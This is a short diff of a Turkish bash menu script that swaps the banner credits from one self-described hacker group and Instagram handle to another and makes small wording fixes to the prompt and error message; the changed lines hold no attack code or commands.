@@ -63,9 +63,9 @@ echo -e '\033[31;40;1m
 	────────────────█████████───────────────
 	──────────────█████████████─────────────
 
-	   \e[35m☾★ ☾★ ☾★ ☾★ YamanEfkar ☾★ ☾★ ☾★ ☾★	
-	 \e[31m☾★ ☾★ ☾★ ☾★ Türk Siber Timi ☾★ ☾★ ☾★ ☾★	
-  \e[32m☾★ ☾★ ☾★ ☾★ İnstagram : @turksibertimi ☾★ ☾★ ☾★ ☾★	
+	   \e[35m☾★ ☾★ ☾★ ☾★ FR13NDS-MRX  ☾★ ☾★ ☾★ ☾★	
+	 \e[31m☾★ ☾★ ☾★ ☾★ FR13NDS HACK GRUBU  ☾★ ☾★ ☾★ ☾★	
+  \e[32m☾★ ☾★ ☾★ ☾★ İnstagram : 72.memoli.72  ☾★ ☾★ ☾★ ☾★	
 '
 echo -e '
 \e[31m[01]\e[32mİnstagram			\e[31m[04]\e[32mFacebook
@@ -78,7 +78,7 @@ echo -e '
 
 
 '
-read -p  "İşlem Numarası:" islem
+read -p  "İşlem Numarası Giriniz:" islem
 }
 
 
@@ -127,7 +127,7 @@ elif [[ $islem == 00 ]]; then
 elif [[ $islem == 99 ]]; then
 	exit 1
 else
-	echo -e '\033[36;40;1m Girdiğniz İşlem Numarasını Kontrol Ediniz....'	
+	echo -e '\033[36;40;1m Girdiğniz İşlem Numarasını Kontrol Ediniz...'	
 	sleep 1
 	clear 
 	banner
